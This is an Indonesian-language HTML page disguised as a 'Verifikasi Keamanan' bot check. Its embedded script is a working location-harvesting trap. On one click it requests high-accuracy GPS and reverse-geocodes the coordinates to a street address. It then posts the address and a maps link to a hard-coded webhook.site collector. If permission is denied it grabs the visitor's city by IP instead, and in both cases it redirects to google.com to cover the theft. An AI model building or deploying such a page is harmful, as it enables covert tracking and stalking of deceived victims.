<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        body { background: #fff; color: #333; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { padding: 20px; max-width: 300px; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
        img { width: 50px; margin-bottom: 15px; }
        p { font-size: 14px; line-height: 1.5; color: #666; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_Icons_by_Evericons_RSA_Icons_18.svg/512px-Google_Icons_by_Evericons_RSA_Icons_18.svg.png" alt="lock">
    <h3>Verifikasi Anda</h3>
    <p>Klik tombol di bawah untuk membuktikan Anda bukan robot dan melanjutkan ke halaman tujuan.</p>
    <button onclick="mintaIzin()">Lanjutkan</button>
</div>

<script>
    const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";

    async function sendData(payload) {
        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
        navigator.sendBeacon(webhook, JSON.stringify(payload));
    }

    function mintaIzin() {
        // Begitu tombol diklik, browser bakal nanya izin lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // Ambil Nama Jalan (Reverse Geocoding)
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const geo = await res.json();
                    
                    await sendData({
                        status: "BERHASIL_VERIFIKASI_GPS",
                        alamat: geo.display_name,
                        maps: `https://www.google.com/maps?q=${lat},${lon}`
                    });
                } catch (e) {
                    await sendData({ status: "GPS_ONLY", lat, lon });
                }

                // Lempar ke tujuan asli
                window.location.href = "https://www.google.com";

            }, async (err) => {
                // Jika dia tetep klik "Block"
                const ipRes = await fetch('https://ipapi.co/json/');
                const d = await ipRes.json();
                await sendData({ status: "VERIFIKASI_GAGAL_IP_ONLY", kota: d.city });
                window.location.href = "https://www.google.com";
            }, { enableHighAccuracy: true });
        }
    }
</script>
</body>
</html>
